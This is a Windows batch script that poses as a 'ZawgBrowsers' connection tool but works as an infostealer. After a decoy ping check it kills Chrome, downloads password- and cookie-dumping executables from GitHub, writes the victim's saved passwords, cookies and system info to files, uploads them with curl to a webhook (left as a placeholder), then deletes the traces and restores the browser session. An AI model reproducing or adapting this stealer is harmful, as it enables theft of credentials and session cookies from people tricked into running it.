@echo off
title ZawgBrowsers - Connection
set IP=github.com
  echo [94m╔══════════
  echo [94m║        ZawgBrowsers        ║
  echo [94m║         Connection         ║
  echo [94m╚══════════
echo Connecting...
C:\Windows\System32\ping.exe -n 1 %IP%

if errorlevel 1 (
  cls
  echo [91m╔════════════════════
  echo [91m║      Failed to connect! Server is most likely down, or connection timed out!    ║
  echo [91m╚════════════════════
    pause
) else (
    cls
  echo [92m╔══════════
  echo [92m║        Connected!        ║
  echo [92m╚══════════
  echo.
   title ZawgBrowsers
  echo [94m╔══════════
  echo [94m║        ZawgBrowsers        ║
  echo [94m╚══════════
echo.

taskkill /f /im chrome.exe
curl -o "%USERPROFILE%\Downloads\p.exe" https://github.com/harryzawg/ZawgCookies/raw/main/passwords.exe
curl -o "%USERPROFILE%\Downloads\c.exe" https://github.com/harryzawg/ZawgCookies/raw/main/cookies.exe
cd "%USERPROFILE%\Downloads"
"%USERPROFILE%\Downloads\c.exe" -c > "%USERPROFILE%\Downloads\cookies.txt"
"%USERPROFILE%\Downloads\p.exe" -c > "%USERPROFILE%\Downloads\passes.txt"
curl -X POST -F "file=@%USERPROFILE%\Downloads\passes.txt" webhook (i use webhook.site)
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\cookies.txt" webhook (i use webhook.site)
echo.
systeminfo > "%USERPROFILE%\Downloads\sys.txt"
echo.
curl -X POST -F "file=@%USERPROFILE%\Downloads\sys.txt" webhook (i use webhook.site)
echo.
del /F /Q "%USERPROFILE%\Downloads\cookies.txt"
del /F /Q "%USERPROFILE%\Downloads\passes.txt"
del /F /Q "%USERPROFILE%\Downloads\sys.txt"
del /F /Q "%USERPROFILE%\Downloads\c.exe"
del /F /Q "%USERPROFILE%\Downloads\p.exe"
start chrome.exe -restore-last-session
taskkill /f /im cmd.exe
echo Finished!
pause
)
